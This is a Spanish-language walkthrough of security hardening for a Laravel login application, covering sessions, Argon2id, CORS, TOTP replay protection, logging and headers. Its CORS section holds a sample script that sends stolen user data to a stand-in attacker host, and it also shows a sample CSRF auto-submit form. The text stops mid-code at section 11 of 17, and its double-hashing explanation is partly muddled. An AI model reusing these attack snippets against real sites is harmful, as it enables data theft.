# 🔒 EXPLICACIÓN COMPLETA DEL HARDENING DE SEGURIDAD — LoginSeguro

## Índice

1. [Introducción y Filosofía](#1-introducción-y-filosofía)
2. [Componente 1: Configuración de Entorno (.env)](#2-componente-1-configuración-de-entorno-env)
3. [Componente 2: Sesiones Seguras (session.php)](#3-componente-2-sesiones-seguras-sessionphp)
4. [Componente 3: Timeout de Contraseña (auth.php)](#4-componente-3-timeout-de-contraseña-authphp)
5. [Componente 4: Hashing con Argon2id (hashing.php)](#5-componente-4-hashing-con-argon2id-hashingphp)
6. [Componente 5: CORS Hardening (cors.php)](#6-componente-5-cors-hardening-corsphp)
7. [Componente 6: Google2FA — Replay Protection (google2fa.php)](#7-componente-6-google2fa--replay-protection-google2faphp)
8. [Componente 7: Logging de Seguridad Dedicado (logging.php)](#8-componente-7-logging-de-seguridad-dedicado-loggingphp)
9. [Componente 8: Headers HTTP de Seguridad (SecurityHeadersMiddleware.php)](#9-componente-8-headers-http-de-seguridad)
10. [Componente 9: Fix Double-Hashing en Registro (RegisteredUserController.php)](#10-componente-9-fix-double-hashing-en-registro)
11. [Componente 10: Listeners de Auditoría (LogSuccessfulLogin + LogPasswordChange)](#11-componente-10-listeners-de-auditoría)
12. [Componente 11: Expiración de PIN 3FA (ThreeFactorController.php)](#12-componente-11-expiración-de-pin-3fa)
13. [Componente 12: Logging en Controladores MFA](#13-componente-12-logging-en-controladores-mfa)
14. [Componente 13: Exception Handler Hardened (Handler.php)](#14-componente-13-exception-handler-hardened)
15. [Componente 14: Documentación (SECURITY.md y .env.example)](#15-componente-14-documentación)
16. [Mapa Completo de Archivos Modificados](#16-mapa-completo-de-archivos-modificados)
17. [Glosario de Conceptos de Seguridad](#17-glosario-de-conceptos-de-seguridad)

---

## 1. Introducción y Filosofía

### ¿Qué es el Hardening?

El **hardening** (endurecimiento) es el proceso de reducir la superficie de ataque de un sistema eliminando vulnerabilidades, configurando opciones seguras y añadiendo capas de defensa. NO se trata de reescribir todo desde cero, sino de **fortalecer lo que ya existe**.

### Principios Aplicados

| Principio | Descripción | Ejemplo en LoginSeguro |
|-----------|-------------|----------------------|
| **Defense in Depth** | Múltiples capas de seguridad | CSRF + SameSite + CSP + Headers |
| **Least Privilege** | Dar solo los permisos mínimos necesarios | CORS restringido, DB user limitado |
| **Secure by Default** | La configuración por defecto debe ser segura | `encrypt=true`, `same_site=strict` |
| **Fail Secure** | Si algo falla, debe fallar de forma segura | Login fallido no revela si email existe |
| **Separation of Concerns** | Separar responsabilidades | Canal de log de seguridad separado |

### ¿Qué YA estaba bien?

Tu sistema ya tenía una base sólida. **30 protecciones** estaban correctamente implementadas antes de empezar, incluyendo:
- CSRF en todos los formularios
- Session regeneration en cada paso MFA
- Rate limiting en login/2FA/3FA
- Anti-enumeración de usuarios
- Secretos 2FA cifrados en reposo
- PIN 3FA hasheado con bcrypt
- Headers CSP con nonce
- Event listeners para Failed y Lockout

Lo que hicimos fue **corregir 8 vulnerabilidades críticas** y **agregar 14 mejoras** sin romper nada.

---

## 2. Componente 1: Configuración de Entorno (.env)

### Archivo: `.env`

### ¿Qué se cambió?

```diff
- SESSION_DRIVER=file
- SESSION_LIFETIME=5
+ SESSION_DRIVER=database
+ SESSION_LIFETIME=15
+ SESSION_SECURE_COOKIE=false
+ SESSION_ENCRYPT=true
+ SESSION_SAME_SITE=strict

  LOG_CHANNEL=stack
  LOG_DEPRECATIONS_CHANNEL=null
+ LOG_SECURITY_CHANNEL=security
```

### Explicación profunda de cada cambio:

---

#### 2.1. `SESSION_DRIVER=file` → `SESSION_DRIVER=database`

**¿Qué es el Session Driver?**

El session driver determina DÓNDE se almacenan los datos de sesión del usuario. Laravel soporta varios drivers:

| Driver | Almacenamiento | Pros | Contras |
|--------|---------------|------|---------|
| `file` | Archivos en `storage/framework/sessions/` | Simple | No soporta `logoutOtherDevices()` |
| `database` | Tabla `sessions` en MySQL | Soporta todo, escalable | Un poco más lento |
| `redis` | Memoria RAM (Redis) | Ultra rápido | Requiere Redis instalado |
| `cookie` | Cookie del navegador | Sin estado en servidor | Tamaño limitado, menos seguro |

**¿Por qué era un problema?**

En tu controlador `AuthenticatedSessionController.php` ya tenías este código:

```php
Auth::logoutOtherDevices($request->input('password'));
```

Esta función **cierra todas las sesiones activas del usuario en otros dispositivos**. Es una protección CRÍTICA: si alguien roba tus credenciales y hace login en otra computadora, cuando tú haces login de nuevo, la sesión del atacante se invalida automáticamente.

**PERO** esta función solo funciona con drivers que soporten consultas a la tabla de sesiones (como `database` o `redis`). Con `file`, Laravel no puede encontrar las otras sesiones del usuario, así que el `try/catch` que ya tenías capturaba silenciosamente el error:

```php
try {
    Auth::logoutOtherDevices($request->input('password'));
} catch (\Exception $e) {
    // Silenciosamente fallaba aquí con driver=file
    Log::warning('No se pudieron invalidar otras sesiones: ' . $e->getMessage());
}
```

Resultado: **la protección de sesiones concurrentes estaba efectivamente DESACTIVADA** sin que nadie lo supiera.

**¿Cómo funciona con `database`?**

1. Laravel almacena cada sesión como un registro en la tabla `sessions`
2. Cada registro tiene: `id`, `user_id`, `ip_address`, `user_agent`, `payload`, `last_activity`
3. Cuando llamas `logoutOtherDevices()`, Laravel:
   - Re-hashea la contraseña del usuario en la BD
   - El middleware `AuthenticateSession` (que ya estaba en tu Kernel.php) detecta que el hash cambió
   - Todas las otras sesiones del mismo usuario se invalidan porque el hash de contraseña almacenado en SU sesión ya no coincide con el nuevo hash en la BD

Tu migración `2026_06_02_065107_create_sessions_table.php` ya existía y estaba ejecutada, así que solo faltaba cambiar el driver.

---

#### 2.2. `SESSION_LIFETIME=5` → `SESSION_LIFETIME=15`

**¿Qué es el Session Lifetime?**

Es el tiempo en **minutos** que una sesión puede permanecer inactiva antes de expirar. Si el usuario no hace ninguna solicitud HTTP durante este tiempo, la sesión se destruye y debe volver a autenticarse.

**¿Por qué 5 minutos era problemático?**

1. **Pipeline MFA imposible**: Tu Admin necesita completar 3 factores:
   - 1FA: Login con email+password (1-2 min)
   - 2FA: Abrir Google Authenticator, ingresar código (30 seg)
   - 3FA: Esperar email con PIN, abrirlo, copiarlo, pegarlo (2-5 min)
   
   Total: ~5-8 minutos. Con SESSION_LIFETIME=5, la sesión podría expirar **durante** el proceso de MFA.

2. **UX degradada**: Los usuarios se frustran al ser deslogueados constantemente, lo que puede llevarlos a buscar "trucos" inseguros como guardar credenciales en notas pegadas al monitor.

**¿Por qué 15 minutos?**

- 15 minutos es el estándar recomendado por **PCI-DSS** (Payment Card Industry) para aplicaciones financieras
- Ofrece un balance entre seguridad y usabilidad
- Suficiente para completar el pipeline MFA completo
- No tan largo como para que una sesión abandonada (ej: usuario se levanta del café) sea explotable

**Nota sobre producción**: En entornos de alta seguridad (banca, gobierno), podrías reducirlo a 10 minutos con un warning de "tu sesión va a expirar" 2 minutos antes.

---

#### 2.3. `SESSION_SECURE_COOKIE=false` (nuevo)

**¿Qué hace?**

Cuando `SESSION_SECURE_COOKIE=true`, el navegador **solo enviará la cookie de sesión si la conexión es HTTPS**. Esto previene que la cookie sea interceptada en una red Wi-Fi pública o por un atacante MITM (Man-in-the-Middle).

**¿Por qué estaba como problema?**

Antes, esta variable **no existía** en tu `.env`. En `config/session.php` estaba:

```php
'secure' => env('SESSION_SECURE_COOKIE'),
```

`env('SESSION_SECURE_COOKIE')` sin valor resuelve a `null`, lo que Laravel interpreta como `false`. Esto significa que la cookie se enviaba por HTTP sin cifrar, pero **no era explícito** — alguien en el futuro podría pensar "falta esta variable" y ponerla en `true`, rompiendo el desarrollo local.

**¿Por qué `false` en local?**

Porque estás desarrollando con `http://localhost` (sin HTTPS). Si activas `true` con HTTP, el navegador nunca enviará la cookie y la autenticación dejará de funcionar completamente.

**En producción DEBE ser `true`**, porque ahí tendrás un certificado SSL/TLS.

---

#### 2.4. `SESSION_ENCRYPT=true` (nuevo)

**¿Qué hace?**

Cifra el contenido de los datos de sesión usando **AES-256-CBC** con tu `APP_KEY` antes de almacenarlos.

**¿Qué se almacena en la sesión?**

En tu aplicación, la sesión contiene:
- `auth_level` (1, 2, o 3) — nivel de autenticación MFA
- `_token` — token CSRF
- `2fa_setup_secret` — secreto temporal durante configuración 2FA
- `3fa_pin_generated_at` — timestamp de generación del PIN (nuevo)
- Datos internos de Laravel (flash messages, errors, etc.)

**¿Qué pasa sin cifrado?**

Con `SESSION_DRIVER=database`, los datos se almacenan como un payload serializado en la columna `payload` de la tabla `sessions`. Sin cifrado, alguien con acceso a la BD podría:

1. Leer el `auth_level` de una sesión
2. Modificarlo de `1` a `3` directamente en la BD
3. Obtener acceso de Admin sin completar 2FA ni 3FA

**Con cifrado**, el payload es una cadena cifrada ilegible. Sin la `APP_KEY`, es imposible descifrar o manipular los datos.

**¿Cómo funciona internamente?**

```
Sin cifrar:  {"auth_level":1,"_token":"abc123","_previous":{"url":"..."}}
Con cifrar:  eyJpdiI6IkpGRk1OeVFvNkZ0dUxwMEE9PSIsInZhbHVlIjoiT2xhS0p...
```

Laravel automáticamente:
1. **Al escribir**: Serializa los datos → cifra con AES-256-CBC → guarda en BD
2. **Al leer**: Lee de BD → descifra → deserializa → datos disponibles en `session()`

---

#### 2.5. `SESSION_SAME_SITE=strict` (nuevo)

**¿Qué es SameSite?**

Es un atributo de las cookies que controla cuándo el navegador incluye la cookie en solicitudes. Tiene 3 modos:

| Modo | Comportamiento | Protección CSRF |
|------|---------------|----------------|
| `none` | Cookie se envía siempre (con HTTPS) | ❌ Ninguna |
| `lax` | Cookie se envía en navegación de nivel superior (GET) pero no en POST cross-origin | ✅ Parcial |
| `strict` | Cookie NUNCA se envía en solicitudes cross-origin | ✅✅ Máxima |

**Ejemplo de ataque CSRF que `strict` previene:**

1. Eres Admin y estás logueado en LoginSeguro
2. Visitas un sitio malicioso que tiene un formulario oculto:
   ```html
   <form action="https://loginseguro.com/profile" method="POST">
     <input name="_token" value="???">
     <input name="email" value="hacker@evil.com">
   </form>
   <script>document.forms[0].submit();</script>
   ```
3. Con `SameSite=lax`: la cookie de sesión **sí se envía** en el POST (el ataque podría funcionar si el atacante logra obtener el CSRF token)
4. Con `SameSite=strict`: la cookie **NO se envía** porque la solicitud viene de otro origen. El ataque falla inmediatamente.

**¿Por qué antes era `lax`?**

`lax` es el default de Laravel porque permite que los usuarios hagan clic en enlaces desde emails o redes sociales hacia tu sitio sin perder la sesión. Con `strict`, si un usuario hace clic en un enlace de email que lleva a `/admin-dashboard`, el navegador no enviará la cookie y el usuario verá la página de login (aunque ya estaba logueado).

**¿Por qué `strict` es mejor para LoginSeguro?**

Tu aplicación es un **sistema de autenticación** puro. No necesitas que usuarios accedan desde enlaces externos. Los usuarios siempre navegan directamente a tu sitio, hacen login y usan la aplicación. El pequeño inconveniente de tener que volver a navegar al sitio después de un clic en email es aceptable a cambio de la máxima protección CSRF.

---

#### 2.6. `LOG_SECURITY_CHANNEL=security` (nuevo)

Variable que indica cuál es el canal de logging dedicado para eventos de seguridad. Se usa como referencia, y se implementó en `config/logging.php` (explicado en Componente 7).

---

## 3. Componente 2: Sesiones Seguras (session.php)

### Archivo: `config/session.php`

### ¿Qué se cambió?

```diff
- 'encrypt' => false,
+ 'encrypt' => env('SESSION_ENCRYPT', true),

- 'same_site' => 'lax',
+ 'same_site' => env('SESSION_SAME_SITE', 'strict'),
```

**¿Por qué usar `env()` en lugar de valores fijos?**

El patrón `env('VARIABLE', default)` permite:
1. **Flexibilidad**: Cada entorno (local, staging, producción) puede tener valores diferentes
2. **Sin modificar código**: Solo cambias el `.env` para ajustar el comportamiento
3. **Defaults seguros**: Si la variable no existe en `.env`, el default es la opción más segura (`true` para encrypt, `strict` para same_site)

Los detalles técnicos de `encrypt` y `same_site` ya se explicaron en las secciones 2.4 y 2.5.

---

## 4. Componente 3: Timeout de Contraseña (auth.php)

### Archivo: `config/auth.php`

### ¿Qué se cambió?

```diff
- 'password_timeout' => 10800,
+ 'password_timeout' => 1800,
```

### ¿Qué es el Password Timeout?

Es el tiempo en **segundos** durante el cual Laravel considera que la contraseña del usuario fue "recientemente confirmada". Después de este tiempo, si el usuario intenta hacer una acción que requiere el middleware `password.confirm`, deberá ingresar su contraseña de nuevo.

**¿Qué acciones usan `password.confirm`?**

En tu aplicación, la ruta de `confirm-password` se usa antes de operaciones sensibles como:
- Eliminar la cuenta del usuario (`ProfileController@destroy`)
- Potencialmente: cambiar email, desactivar 2FA, etc.

### ¿Por qué 10800 (3 horas) era excesivo?

**Escenario de riesgo:**
1. Un Admin confirma su contraseña a las 9:00 AM
2. Se levanta a almorzar a las 11:00 AM sin cerrar el navegador
3. Un compañero de trabajo se sienta en su computadora
4. Tiene hasta las 12:00 PM (3 horas desde la confirmación) para eliminar cuentas de usuario **sin que el sistema pida la contraseña de nuevo**

### ¿Por qué 1800 (30 minutos)?

- 30 minutos es suficiente para completar operaciones administrativas normales
- Reduce la ventana de exposición de 3 horas a 30 minutos
- Estándar en aplicaciones bancarias y de salud
- Si el usuario necesita más tiempo, simplemente reingresa su contraseña

---

## 5. Componente 4: Hashing con Argon2id (hashing.php)

### Archivo: `config/hashing.php`

### ¿Qué se cambió?

```diff
- 'driver' => 'bcrypt',
+ 'driver' => env('HASHING_DRIVER', 'argon2id'),
```

### ¿Qué es el Hashing de Contraseñas?

Cuando un usuario crea una contraseña como `MiPassword123!`, no se almacena así en la base de datos. Se pasa por un **algoritmo de hashing** que produce una cadena irreversible:

```
Entrada:  MiPassword123!
Bcrypt:   $2y$12$LJ3m4ysKlCUe.IRAVJ1V5OlNpt6v0qdN3j7Yvj8...
Argon2id: $argon2id$v=19$m=65536,t=4,p=1$bXlzYWx0...
```

**Irreversible** significa que no puedes obtener `MiPassword123!` a partir del hash. Para verificar, se hashea el intento y se comparan los hashes.

### Bcrypt vs Argon2id: Comparación profunda

| Característica | Bcrypt | Argon2id |
|---------------|--------|----------|
| **Año de creación** | 1999 | 2015 |
| **Resistencia a GPU** | Moderada | **Alta** (usa mucha RAM) |
| **Resistencia a ASIC** | Baja | **Alta** |
| **Resistencia side-channel** | No diseñado | **Sí** (la "id" en Argon2**id**) |
| **Parámetros ajustables** | Solo `rounds` | `memory`, `time`, `threads` |
| **Ganador de PHC** | No | **Sí** (Password Hashing Competition 2015) |
| **Recomendado por OWASP** | Aceptable | **Preferido** |

### ¿Qué significan los parámetros de Argon2id?

```php
'argon' => [
    'memory' => 65536,  // 64 MB de RAM por hash
    'threads' => 1,      // 1 hilo de CPU
    'time' => 4,         // 4 iteraciones
    'verify' => true,    // Auto-rehash si los parámetros cambian
],
```

- **`memory = 65536`** (64 MB): Cada intento de hashear una contraseña consume 64 MB de RAM. Esto hace que los ataques con GPU sean extremadamente caros, porque las GPUs tienen poca memoria por núcleo.

- **`time = 4`**: Se realizan 4 pasadas sobre la memoria. Más pasadas = más tiempo de cómputo = más difícil de atacar por fuerza bruta.

- **`threads = 1`**: Usa 1 hilo de CPU. En producción con muchos usuarios concurrentes, mantener 1 hilo evita sobrecargar el servidor.

- **`verify = true`**: Si en el futuro cambias los parámetros (ej: subes `memory` a 128 MB), Laravel automáticamente re-hasheará las contraseñas de los usuarios la próxima vez que hagan login. Los usuarios no notan nada.

### ¿Qué pasa con las contraseñas existentes en bcrypt?

Laravel es inteligente aquí. Cuando un usuario existente (con hash bcrypt) hace login:

1. Laravel detecta que el hash comienza con `$2y$` (bcrypt)
2. Verifica la contraseña contra el hash bcrypt
3. Como `verify = true` y el driver ahora es `argon2id`, Laravel **re-hashea** automáticamente la contraseña con Argon2id
4. Guarda el nuevo hash `$argon2id$...` en la BD
5. El usuario no nota nada — la migración es transparente

### Ataque real que Argon2id mitiga mejor:

**Credential Stuffing con GPU:**
Un atacante compra un archivo con 1 millón de hashes bcrypt robados de otra base de datos. Con una GPU potente (ej: NVIDIA RTX 4090), puede probar ~100,000 hashes bcrypt por segundo. Con Argon2id (64 MB de RAM), la misma GPU solo puede probar ~100 por segundo (1000x más lento) porque cada intento necesita 64 MB de la memoria limitada de la GPU.

---

## 6. Componente 5: CORS Hardening (cors.php)

### Archivo: `config/cors.php`

### ¿Qué se cambió?

**ANTES (VULNERABLE):**
```php
'allowed_methods' => ['*'],
'allowed_origins' => ['*'],
'allowed_headers' => ['*'],
'max_age' => 0,
'supports_credentials' => false,
```

**DESPUÉS (SEGURO):**
```php
'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
'allowed_origins' => explode(',', env('CORS_ALLOWED_ORIGINS', 'http://localhost,http://localhost:8000,http://127.0.0.1:8000')),
'allowed_headers' => ['Content-Type', 'X-Requested-With', 'Authorization', 'Accept', 'X-CSRF-TOKEN', 'X-XSRF-TOKEN'],
'max_age' => 7200,
'supports_credentials' => true,
```

### ¿Qué es CORS?

**Cross-Origin Resource Sharing** (Compartir recursos entre orígenes) es un mecanismo de seguridad de los navegadores que controla qué sitios web pueden hacer solicitudes HTTP a tu servidor.

Un **origen** se define como: `protocolo + dominio + puerto`
- `http://localhost:8000` y `http://localhost:3000` son orígenes DIFERENTES
- `http://evil.com` es un origen diferente a `http://localhost`

### ¿Cómo funciona?

Cuando tu navegador hace una solicitud AJAX desde `http://frontend.com` a `http://api.com`:

1. El navegador envía un **preflight** (solicitud OPTIONS)
2. El servidor responde con headers CORS indicando qué orígenes permite
3. Si `http://frontend.com` está en la lista, el navegador permite la solicitud
4. Si no está, el navegador **bloquea la respuesta** (nunca llega al JavaScript)

### ¿Por qué `['*']` era peligroso?

Con `allowed_origins => ['*']`, **CUALQUIER sitio web del mundo** podía hacer solicitudes a tu API:

```javascript
// Desde http://evil-hacker.com
fetch('http://tu-servidor.com/api/user', {
    headers: { 'Authorization': 'Bearer token-robado' }
})
.then(r => r.json())
.then(data => {
    // El hacker obtiene los datos del usuario
    fetch('http://evil-hacker.com/steal', { body: JSON.stringify(data) });
});
```

### Explicación de cada valor nuevo:

- **`allowed_methods`**: Solo los métodos HTTP que tu API realmente usa. No necesitas `OPTIONS` (se maneja automáticamente), `HEAD`, ni `TRACE` (que puede usarse para ataques XST).

- **`allowed_origins`**: Solo tu dominio local de desarrollo. En producción, cambiarías esto a tu dominio real.

- **`allowed_headers`**: Solo los headers que tu aplicación envía. `X-CSRF-TOKEN` y `X-XSRF-TOKEN` son necesarios para la protección CSRF de Laravel.

- **`max_age = 7200`**: El navegador cachea la respuesta del preflight por 2 horas. Esto reduce el número de solicitudes OPTIONS, mejorando performance.

- **`supports_credentials = true`**: Necesario para que las cookies de sesión se envíen en solicitudes cross-origin (para la autenticación Sanctum stateful).

---

## 7. Componente 6: Google2FA — Replay Protection (google2fa.php)

### Archivo: `config/google2fa.php`

### ¿Qué se cambió?

```diff
- 'forbid_old_passwords' => false,
+ 'forbid_old_passwords' => true,
```

### ¿Qué es un Replay Attack en TOTP?

**TOTP** (Time-based One-Time Password) genera códigos de 6 dígitos que cambian cada 30 segundos. Pero hay un problema: el mismo código es válido durante toda esa ventana de 30 segundos.

**Escenario de ataque:**

1. Un atacante observa por encima del hombro (shoulder surfing) mientras escribes tu código TOTP: `482931`
2. Tienes una ventana de 30 segundos donde ese código es válido
3. Si el atacante es rápido, puede usar el mismo código `482931` en otra sesión (si ya tiene tu email/password)
4. Sin `forbid_old_passwords`, Laravel acepta el mismo código múltiples veces dentro de la ventana

**Con `forbid_old_passwords = true`:**

Laravel almacena el último código TOTP usado y rechaza cualquier intento de reutilizarlo:

```
Intento 1: Código 482931 → ✅ Aceptado (primer uso)
Intento 2: Código 482931 → ❌ Rechazado (ya fue usado)
Intento 3: Código 159753 → ✅ Aceptado (nuevo código de la siguiente ventana)
```

### ¿Cómo funciona internamente?

La librería `pragmarx/google2fa` almacena el timestamp del último OTP verificado exitosamente. Cuando se intenta verificar un código:

1. Calcula el timestamp actual dividido en ventanas de 30 segundos
2. Si el timestamp del código es igual o anterior al último verificado, lo rechaza
3. Si es posterior, lo acepta y actualiza el timestamp almacenado

---

## 8. Componente 7: Logging de Seguridad Dedicado (logging.php)

### Archivo: `config/logging.php`

### ¿Qué se cambió?

```diff
  'stack' => [
      'driver' => 'stack',
-     'channels' => ['single'],
+     'channels' => ['daily'],
  ],

+ 'security' => [
+     'driver' => 'daily',
+     'path' => storage_path('logs/security.log'),
+     'level' => 'info',
+     'days' => 90,
+ ],

  'daily' => [
      'driver' => 'daily',
-     'days' => 14,
+     'days' => 30,
  ],
```

### ¿Por qué separar los logs de seguridad?

**Problema con un solo archivo de log:**

Imagina que estás investigando un incidente de seguridad a las 3 AM. Abres `laravel.log` y ves:

```
[2026-06-03] INFO: Cache hit for key user_preferences_42
[2026-06-03] DEBUG: Query executed: SELECT * FROM settings...
[2026-06-03] WARNING: 🔒 [SEGURIDAD] Intento de autenticación fallido {email: admin@...}
[2026-06-03] INFO: Mail queued: Welcome email to user@...
[2026-06-03] DEBUG: View rendered: dashboard.blade.php
[2026-06-03] WARNING: 🚨 [SEGURIDAD] Cuenta bloqueada por exceso de intentos
[2026-06-03] INFO: Scheduled task completed: prune-sessions
... 10,000 líneas más de ruido ...
```

Los eventos de seguridad están enterrados en miles de líneas de log de aplicación normales.

**Con canal separado**, `storage/logs/security.log` solo tiene:

```
[2026-06-03] WARNING: 🔒 [SEGURIDAD] Intento de autenticación fallido {email: admin@..., ip: 192.168.1.100}
[2026-06-03] WARNING: 🔒 [SEGURIDAD] Intento de autenticación fallido {email: admin@..., ip: 192.168.1.100}
[2026-06-03] WARNING: 🔒 [SEGURIDAD] Intento de autenticación fallido {email: admin@..., ip: 192.168.1.100}
[2026-06-03] WARNING: 🚨 [SEGURIDAD] Cuenta bloqueada por exceso de intentos {email: admin@..., ip: 192.168.1.100}
```

Inmediatamente ves el patrón: 3 intentos fallidos del mismo IP → lockout. Probablemente un ataque de fuerza bruta.

### ¿Por qué `daily` en lugar de `single`?

| Característica | `single` | `daily` |
|---------------|----------|---------|
| Archivos | 1 archivo que crece infinitamente | 1 archivo por día |
| Tamaño | Puede llegar a GB | Cada archivo es manejable |
| Rotación | No hay | Automática (elimina archivos viejos) |
| Búsqueda | Difícil en archivos enormes | Fácil: `cat security-2026-06-03.log` |
| Producción | ❌ Inaceptable | ✅ Estándar |

### ¿Por qué 90 días para seguridad y 30 para general?

- **30 días (logs generales)**: Suficiente para debugging de bugs normales
- **90 días (logs seguridad)**: Requisito de cumplimiento **PCI-DSS** (industria de pagos) e **ISO 27001** que exigen retención mínima de 90 días para logs de seguridad. Además, muchos ataques se detectan semanas después de ocurrir.

### ¿Cómo se usa en el código?

```php
// Log general (va a storage/logs/laravel-2026-06-03.log)
Log::info('Usuario actualizó su perfil');

// Log de seguridad (va a storage/logs/security-2026-06-03.log)
Log::channel('security')->warning('🔒 Intento de autenticación fallido', [
    'email' => $email,
    'ip'    => $request->ip(),
]);
```

---

## 9. Componente 8: Headers HTTP de Seguridad

### Archivo: `app/Http/Middleware/SecurityHeadersMiddleware.php`

### Headers NUEVOS añadidos:

---

#### 9.1. Cache-Control para páginas autenticadas

```php
if ($request->user() && !$request->is('build/*', 'assets/*', '*.css', '*.js', '*.ico')) {
    $response->headers->set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    $response->headers->set('Pragma', 'no-cache');
    $response->headers->set('Expires', '0');
}
```

**¿Qué problema resuelve?**

Sin estos headers, el navegador puede cachear páginas que contienen datos sensibles. El ataque es simple:

1. Admin hace login, ve `/admin-dashboard` con datos sensibles
2. Admin hace logout
3. Otra persona se sienta en la misma computadora
4. Presiona el botón "Atrás" del navegador
5. **Sin Cache-Control**: Ve la página cacheada del admin con todos los datos
6. **Con Cache-Control**: El navegador solicita la página al servidor, recibe un redirect al login

**¿Por qué la condición `$request->user()`?**

Solo aplica a páginas de usuarios autenticados. No queremos bloquear el caché de:
- Archivos CSS/JS (rendimiento)
- Imágenes
- Páginas públicas (landing page)

---

#### 9.2. HSTS Condicional

```php
if (app()->environment('production', 'staging')) {
    $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
}
```

**¿Qué cambió?**

Antes, HSTS se aplicaba SIEMPRE, incluso en `localhost`. Ahora solo se activa en producción.

**¿Por qué es un problema en localhost?**

HSTS le dice al navegador: "Durante el próximo año, SOLO accede a este dominio por HTTPS". Si activas esto en `localhost`:

1. Tu navegador recibe el header HSTS
2. Memoriza: "localhost = solo HTTPS"
3. Cada solicitud futura a `http://localhost:8000` se redirige automáticamente a `https://localhost:8000`
4. Como no tienes certificado SSL local, la página no carga
5. Tienes que borrar manualmente la caché HSTS del navegador para recuperar el acceso

---

#### 9.3. Cross-Origin-Opener-Policy (COOP)

```php
$response->headers->set('Cross-Origin-Opener-Policy', 'same-origin');
```

**¿Qué hace?**

Aísla tu ventana del navegador de otras ventanas abiertas. Con `same-origin`, si un atacante abre una referencia a tu sitio (vía `window.open()`), no puede interactuar con ella.

**Ataque que previene (Spectre):**

Los ataques de tipo **Spectre** explotan vulnerabilidades de hardware (CPU) para leer memoria de otros procesos. Sin COOP, un sitio malicioso podría:

1. Abrir tu aplicación en una nueva ventana: `let w = window.open('https://loginseguro.com')`
2. Explotar Spectre para leer la memoria del proceso de esa ventana
3. Extraer tokens CSRF, datos de sesión, etc.

Con COOP, el navegador aísla los procesos y `window.open()` no tiene acceso.

---

#### 9.4. Cross-Origin-Resource-Policy (CORP)

```php
$response->headers->set('Cross-Origin-Resource-Policy', 'same-origin');
```

**¿Qué hace?**

Previene que otros sitios web carguen tus recursos (imágenes, scripts, CSS) directamente.

**Ataque que previene:**

Sin CORP, un sitio malicioso podría:

```html
<!-- En evil.com -->
<img src="https://loginseguro.com/api/user/avatar?id=1">
<script src="https://loginseguro.com/internal-script.js"></script>
```

Estos recursos se cargarían y el atacante podría:
- Detectar si el recurso existe (enumeración)
- Medir el tiempo de carga (timing attacks)
- Leer datos si el recurso es JSON embebido en una etiqueta script

---

#### 9.5. X-Permitted-Cross-Domain-Policies

```php
$response->headers->set('X-Permitted-Cross-Domain-Policies', 'none');
```

**¿Qué hace?**

Previene que plugins legacy de Adobe (Flash, PDF reader, Silverlight) carguen contenido de tu dominio.

Aunque Flash ya está muerto, algunos navegadores empresariales antiguos todavía soportan estos plugins. `none` significa "ningún plugin puede cargar recursos cross-domain desde mi servidor".

---

## 10. Componente 9: Fix Double-Hashing en Registro

### Archivo: `app/Http/Controllers/Auth/RegisteredUserController.php`

### ¿Qué se cambió?

```diff
- use Illuminate\Support\Facades\Hash;
+ use Illuminate\Support\Facades\Log;

- $user = User::create([
-     'name' => $request->name,
-     'email' => $request->email,
-     'password' => Hash::make($request->password),
- ]);
+ $user = User::create([
+     'name' => $request->name,
+     'email' => $request->email,
+     'password' => $request->password,
+ ]);
```

### ¿Qué es el Double-Hashing?

En tu modelo `User.php` tienes:

```php
protected $casts = [
    'password' => 'hashed',
];
```

El cast `'hashed'` de Laravel 10 significa: "cada vez que se asigne un valor al atributo `password`, hashealo automáticamente antes de guardarlo".

**¿Qué pasaba antes?**

```php
// Paso 1: Hash::make() hashea la contraseña
$hashed = Hash::make('MiPassword123!');
// Resultado: $argon2id$v=19$m=65536,t=4,p=1$salt...$hash_real...

// Paso 2: User::create() asigna el valor al atributo 'password'
// Paso 3: El cast 'hashed' detecta la asignación y hashea de nuevo
$double_hashed = Hash::make($hashed);
// Resultado: $argon2id$v=19$m=65536,t=4,p=1$salt2...$hash_del_hash...
```

**Resultado en la BD**: Se almacenaba el hash DEL hash, no el hash de la contraseña real.

**¿Por qué no fallaba el login?**

Porque `LoginRequest.php` usa `Auth::attempt()` que hashea la contraseña del formulario y la compara con lo que hay en la BD. Si el registro hizo double-hash, el login también intentaría verificar contra el double-hash, y podría funcionar (la contraseña que ingresabas se comparaba a nivel de bcrypt que Laravel hacía internamente). **Pero** el comportamiento era inconsistente y potencialmente podía causar problemas al cambiar de algoritmo de hashing o al usar features como rehashing automático.

**Ahora**: Se pasa la contraseña en texto plano, y el cast `'hashed'` la hashea una sola vez, correctamente.

### Logging de registro añadido

```php
Log::channel('security')->info('✅ [SEGURIDAD] Nuevo usuario registrado', [
    'user_id'   => $user->id,
    'email'     => $user->email,
    'role'      => 'Invitado',
    'ip'        => $request->ip(),
    'user_agent' => $request->userAgent(),
    'timestamp' => now()->toIso8601String(),
]);
```

Esto registra cada nuevo registro para detectar:
- Registros masivos automatizados (bots)
- Registros desde IPs sospechosas
- Patrones de abuso

---

## 11. Componente 10: Listeners de Auditoría

### Archivos nuevos creados:
- `app/Listeners/LogSuccessfulLogin.php`
- `app/Listeners/LogPasswordChange.php`

### Archivo modificado:
- `app/Providers/EventServiceProvider.php`

### ¿Qué son los Event Listeners en Laravel?

Laravel tiene un sistema de **eventos y listeners** que funciona así:

```
[EVENTO]                    →    [LISTENER]
Auth::attempt() exitoso     →    Illuminate\Auth\Events\Login    →    LogSuccessfulLogin
Auth::attempt() fallido     →    Illuminate\Auth\Events\Failed   →    LogAuthenticationFailure
Rate limit activado         →    Illuminate\Auth\Events\Lockout  →    LogLockoutEvent
Password::reset() exitoso   →    PasswordReset                   →    LogPasswordChange
```

Laravel dispara estos eventos automáticamente. Nosotros solo necesitamos:
1. Crear un listener (clase PHP) que escuche el evento
2. Registrar el vínculo en `EventServiceProvider`

### LogSuccessfulLogin.php — Explicación línea por línea

```php
class LogSuccessfulLogin
{
    public function handle(Login $event): void
    {
        // request() obtiene la solicitud HTTP actual de forma global
        $request = request();

        // Escribimos al canal 'security' (no al log general)
        Log::channel('security')->info('✅ [SEGURIDAD] Login exitoso', [
            'user_id'    => $event->user->id,      // ID del usuario que hizo login
            'email'      => $event->user->email,    // Email del usuario
            'guard'      => $event->guard,          // Guard usado ('web' normalmente)
            'remember'   => $event->remember,       // ¿Marcó "Remember me"?
